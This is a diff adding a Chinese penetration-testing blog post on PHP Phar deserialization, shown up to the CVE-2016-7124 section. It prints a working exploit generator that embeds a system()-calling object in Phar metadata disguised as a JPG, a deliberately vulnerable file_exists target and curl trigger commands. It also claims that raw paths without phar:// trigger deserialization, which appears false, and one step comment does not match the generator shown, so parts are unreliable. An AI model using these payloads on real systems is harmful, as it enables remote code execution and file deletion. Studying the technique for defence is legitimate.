@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言PHP反序列化漏洞中，传统利用依赖unserialize()。然而Phar协议提供了一条不依赖unserialize()即可反序列化的路径：只要程序对用户可控的路径使用file_exists、is_file等文件操作函数，攻击者上传恶意Phar文件后即可触发反序列化，进而通过POP链实现代码执行。 本文涵盖Phar反序列化原理、构造方法、CVE-2016-7124绕过及防御措施。 Phar文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP Phar反序列化">
+<meta property="og:url" content="https://congliang.github.io/Deserialization-php-phar/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言PHP反序列化漏洞中，传统利用依赖unserialize()。然而Phar协议提供了一条不依赖unserialize()即可反序列化的路径：只要程序对用户可控的路径使用file_exists、is_file等文件操作函数，攻击者上传恶意Phar文件后即可触发反序列化，进而通过POP链实现代码执行。 本文涵盖Phar反序列化原理、构造方法、CVE-2016-7124绕过及防御措施。 Phar文件">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:35:18.321Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Deserialization-php-phar/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Deserialization-php-phar/","path":"Deserialization-php-phar/","title":"PHP Phar反序列化"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PHP Phar反序列化 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-number">2.</span> <span class="nav-text">Phar文件结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Stub%EF%BC%88%E5%BC%95%E5%AF%BC%E6%AE%B5%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">1. Stub（引导段）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Manifest%EF%BC%88%E6%B8%85%E5%8D%95%E6%AE%B5%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">2. Manifest（清单段）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-File-Contents%EF%BC%88%E5%86%85%E5%AE%B9%E6%AE%B5%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">3. File Contents（内容段）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Signature%EF%BC%88%E7%AD%BE%E5%90%8D%E6%AE%B5%EF%BC%89"><span class="nav-number">2.4.</span> <span class="nav-text">4. Signature（签名段）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">反序列化触发原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8FPhar%E6%96%87%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">构造恶意Phar文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E8%A7%A6%E5%8F%91%E6%BC%94%E7%A4%BA"><span class="nav-number">5.</span> <span class="nav-text">文件操作触发演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E4%BB%A3%E7%A0%81"><span class="nav-number">5.1.</span> <span class="nav-text">目标代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">5.2.</span> <span class="nav-text">攻击步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-7124-wakeup-%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">CVE-2016-7124: __wakeup() 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8Phar%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-number">6.2.</span> <span class="nav-text">在Phar中的应用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POP%E9%93%BE%E5%AE%9E%E6%88%98%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.</span> <span class="nav-text">POP链实战示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%9D%91%E7%82%B9"><span class="nav-number">8.</span> <span class="nav-text">绕过技巧与坑点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9B%BE%E7%89%87%E5%A4%B4%E4%BC%AA%E8%A3%85%E6%9C%89%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B"><span class="nav-number">8.1.</span> <span class="nav-text">1. 图片头伪装有文件类型检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BA%8C%E6%AC%A1%E5%8E%8B%E7%BC%A9%E7%A0%B4%E5%9D%8F%E6%A0%BC%E5%BC%8F"><span class="nav-number">8.2.</span> <span class="nav-text">2. 二次压缩破坏格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-phar-%E4%BB%85%E9%99%90%E6%9C%AC%E5%9C%B0"><span class="nav-number">8.3.</span> <span class="nav-text">3. phar:&#x2F;&#x2F;仅限本地</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-PHP%E9%85%8D%E7%BD%AE%E5%BD%B1%E5%93%8D"><span class="nav-number">8.4.</span> <span class="nav-text">4. PHP配置影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-getimagesize-%E5%8F%8C%E9%87%8D%E5%88%A9%E7%94%A8"><span class="nav-number">8.5.</span> <span class="nav-text">5. getimagesize() 双重利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E7%AD%BE%E5%90%8D%E9%87%8D%E7%AE%97%E9%97%AE%E9%A2%98"><span class="nav-number">8.6.</span> <span class="nav-text">6. 签名重算问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="nav-number">9.</span> <span class="nav-text">防御方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BF%87%E6%BB%A4-phar-%E5%8D%8F%E8%AE%AE%E5%B9%B6%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="nav-number">9.1.</span> <span class="nav-text">1. 过滤 phar:&#x2F;&#x2F; 协议并限制文件路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%B9%B6%E8%BD%AC%E5%86%99"><span class="nav-number">9.2.</span> <span class="nav-text">2. 检查文件内容并转写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%8D%87%E7%BA%A7PHP%E7%89%88%E6%9C%AC"><span class="nav-number">9.3.</span> <span class="nav-text">3. 升级PHP版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%A6%81%E7%82%B9"><span class="nav-number">9.4.</span> <span class="nav-text">4. 代码审计要点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">11.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Deserialization-php-phar/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PHP Phar反序列化 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP Phar反序列化
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-04-15T08:00:00+08:00">2026-04-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP反序列化漏洞中，传统利用依赖<code>unserialize()</code>。然而Phar协议提供了一条<strong>不依赖<code>unserialize()</code>即可反序列化</strong>的路径：只要程序对用户可控的路径使用<code>file_exists</code>、<code>is_file</code>等文件操作函数，攻击者上传恶意Phar文件后即可触发反序列化，进而通过POP链实现代码执行。</p>
+<p>本文涵盖Phar反序列化原理、构造方法、CVE-2016-7124绕过及防御措施。</p>
+<h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><p>Phar（PHP Archive）是PHP 5.3起引入的归档格式，由四部分组成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| Stub | Manifest | File Contents | Signature |</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-Stub（引导段）"><a href="#1-Stub（引导段）" class="headerlink" title="1. Stub（引导段）"></a>1. Stub（引导段）</h3><p>头部PHP代码段，必须包含<code>__HALT_COMPILER(); ?&gt;</code>作为结束标识。PHP解析器遇到此函数停止编译，后续数据即为Phar归档。注意Stub可以是任意PHP代码。</p>
+<h3 id="2-Manifest（清单段）"><a href="#2-Manifest（清单段）" class="headerlink" title="2. Manifest（清单段）"></a>2. Manifest（清单段）</h3><p>存储包内所有文件的元数据，格式类似于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;total_files&#x27;</span> =&gt; ...,</span><br><span class="line">    <span class="string">&#x27;version&#x27;</span>     =&gt; ...,</span><br><span class="line">    <span class="string">&#x27;files&#x27;</span>       =&gt; [</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>      =&gt; ...,</span><br><span class="line">            <span class="string">&#x27;metadata&#x27;</span>  =&gt; ...,   <span class="comment">// ★ 攻击点：序列化存储，解析时自动反序列化</span></span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span> =&gt; ...,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>      =&gt; ...,</span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p><strong>核心漏洞</strong>：Manifest中的<code>metadata</code>字段在Phar文件被解析时，PHP会自动调用<code>unserialize()</code>将其反序列化。攻击者在此处植入恶意对象，即可在任意文件操作函数触发时完成反序列化攻击。</p>
+<h3 id="3-File-Contents（内容段）"><a href="#3-File-Contents（内容段）" class="headerlink" title="3. File Contents（内容段）"></a>3. File Contents（内容段）</h3><p>Phar包内各文件的原始内容，构造时必须至少包含一个文件。</p>
+<h3 id="4-Signature（签名段）"><a href="#4-Signature（签名段）" class="headerlink" title="4. Signature（签名段）"></a>4. Signature（签名段）</h3><p>文件末尾的完整性校验数据，支持SHA1、SHA256、SHA512和MD5（PHP 5.x）。手工修改Phar二进制数据后需重新计算签名，否则文件校验失败。</p>
+<h2 id="反序列化触发原理"><a href="#反序列化触发原理" class="headerlink" title="反序列化触发原理"></a>反序列化触发原理</h2><p>PHP提供了<code>phar://</code>流包装器访问Phar包内的文件。当以下函数操作Phar文件时，PHP底层会解析Manifest并自动反序列化<code>metadata</code>：</p>
+<ul>
+<li><code>file_exists()</code> &#x2F; <code>is_file()</code> &#x2F; <code>is_dir()</code> &#x2F; <code>filesize()</code> &#x2F; <code>stat()</code> &#x2F; <code>lstat()</code></li>
+<li><code>file_get_contents()</code> &#x2F; <code>fopen()</code> &#x2F; <code>readfile()</code> &#x2F; <code>include()</code> &#x2F; <code>require()</code></li>
+<li><code>opendir()</code> &#x2F; <code>scandir()</code> &#x2F; <code>glob()</code> &#x2F; <code>copy()</code> &#x2F; <code>rename()</code> &#x2F; <code>unlink()</code></li>
+<li><code>parse_ini_file()</code> &#x2F; <code>getimagesize()</code> &#x2F; <code>fileatime()</code> &#x2F; <code>filemtime()</code></li>
+</ul>
+<p>触发流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件操作函数(path)</span><br><span class="line">  → PHP检测Phar文件格式 → 解析Stub定位Manifest</span><br><span class="line">    → 读取metadata → 执行unserialize(metadata)</span><br><span class="line">      → 触发__wakeup() / __destruct() 等魔术方法</span><br><span class="line">        → POP链利用 → 代码执行</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键细节</strong>：即使不使用<code>phar://</code>协议，仅传入Phar文件的原始路径，<code>file_exists</code>、<code>is_file</code>等函数也会在判断文件类型时解析Manifest，从而触发反序列化。Phar文件的识别不依赖扩展名——<code>.jpg</code>、<code>.png</code>结尾的Phar文件同样被解析。</p>
+<h2 id="构造恶意Phar文件"><a href="#构造恶意Phar文件" class="headerlink" title="构造恶意Phar文件"></a>构造恶意Phar文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// exploit-gen.php — 需 php -d phar.readonly=0 执行</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;payload.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stub必须以 __HALT_COMPILER(); ?&gt; 结尾</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须至少添加一个文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★ 将恶意对象设为metadata</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Evil</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改扩展名绕过上传限制</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;payload.phar&#x27;</span>, <span class="string">&#x27;payload.jpg&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[+] payload.jpg generated.\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>执行：<code>php -d phar.readonly=0 exploit-gen.php</code>（因为<code>php.ini</code>默认<code>phar.readonly=On</code>禁止写入）。</p>
+<p>生成的<code>payload.jpg</code>表面是图片，本质是合法Phar文件，上传后即可用于攻击。</p>
+<h2 id="文件操作触发演示"><a href="#文件操作触发演示" class="headerlink" title="文件操作触发演示"></a>文件操作触发演示</h2><h3 id="目标代码"><a href="#目标代码" class="headerlink" title="目标代码"></a>目标代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// vuln.php — 典型漏洞场景</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileDelete</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;/var/www/html/index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="comment">// 仅使用了 file_exists 判断文件存在性</span></span><br><span class="line"><span class="comment">// 但传入Phar文件路径就会触发反序列化</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File exists: <span class="subst">$file</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 生成恶意Phar（FileDelete类，设置删除目标的关键文件）</span></span><br><span class="line">php -d phar.readonly=0 gen.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 上传payload.jpg到 /var/www/html/uploads/payload.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 触发 — 使用phar://协议：</span></span><br><span class="line">curl <span class="string">&quot;http://target/vuln.php?file=phar:///var/www/html/uploads/payload.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 或者直接路径（file_exists同样触发）：</span></span><br><span class="line">curl <span class="string">&quot;http://target/vuln.php?file=/var/www/html/uploads/payload.jpg&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2016-7124-wakeup-绕过"><a href="#CVE-2016-7124-wakeup-绕过" class="headerlink" title="CVE-2016-7124: __wakeup() 绕过"></a>CVE-2016-7124: __wakeup() 绕过</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当序列化字符串中对象属性个数值<strong>大于</strong>实际属性个数时，PHP跳过<code>__wakeup()</code>调用。</p>
+<p>受影响版本：PHP 5 &lt; 5.6.25，PHP 7 &lt; 7.0.10。</p>
